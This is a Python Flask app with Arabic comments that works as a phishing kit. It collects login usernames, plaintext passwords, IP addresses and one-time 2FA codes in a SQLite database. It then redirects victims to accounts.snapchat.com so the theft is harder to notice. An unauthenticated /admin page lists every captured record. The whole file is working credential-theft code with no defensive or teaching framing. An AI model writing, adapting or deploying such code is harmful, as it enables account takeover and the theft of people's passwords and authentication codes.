from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

LOG_FILE = 'log.txt'

def log(message):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] {message}\n")

# تهيئة قاعدة البيانات
def init_db():
    db_path = os.path.abspath('login_attempts.db')
    log(f"Using DB at: {db_path}")
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME NOT NULL,
            ip_address TEXT NOT NULL,
            otp_code TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    timestamp = datetime.now()

    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO login_attempts (username, password, timestamp, ip_address, otp_code)
        VALUES (?, ?, ?, ?, ?)
    ''', (username, password, timestamp, ip_address, ''))
    conn.commit()
    conn.close()

    log(f"Login received: username={username}, ip={ip_address}")
    session['username'] = username
    return redirect(url_for('otp'))

@app.route('/otp')
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('otp.html')

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    if 'username' not in session:
        return redirect(url_for('login'))

    otp_code = request.form['otp_code']
    username = session['username']

    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()

    cursor.execute('''
        SELECT id FROM login_attempts
        WHERE username = ?
        ORDER BY timestamp DESC
        LIMIT 1
    ''', (username,))
    result = cursor.fetchone()

    if result:
        latest_id = result[0]
        log(f"OTP submitted for {username}: {otp_code} (updating id={latest_id})")

        cursor.execute('''
            UPDATE login_attempts
            SET otp_code = ?
            WHERE id = ?
        ''', (otp_code, latest_id))
        conn.commit()

        # تحقق من التحديث
        cursor.execute('SELECT otp_code FROM login_attempts WHERE id = ?', (latest_id,))
        updated_otp = cursor.fetchone()
        log(f"DB value after update for id {latest_id}: {updated_otp[0]}")
    else:
        log(f"No record found for user: {username} - OTP not saved.")

    conn.close()
    return redirect("https://accounts.snapchat.com")

@app.route('/admin')
def admin():
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM login_attempts ORDER BY timestamp DESC')
    attempts = cursor.fetchall()
    conn.close()
    return render_template('admin.html', attempts=attempts)

if __name__ == '__main__':
    app.run(debug=True)
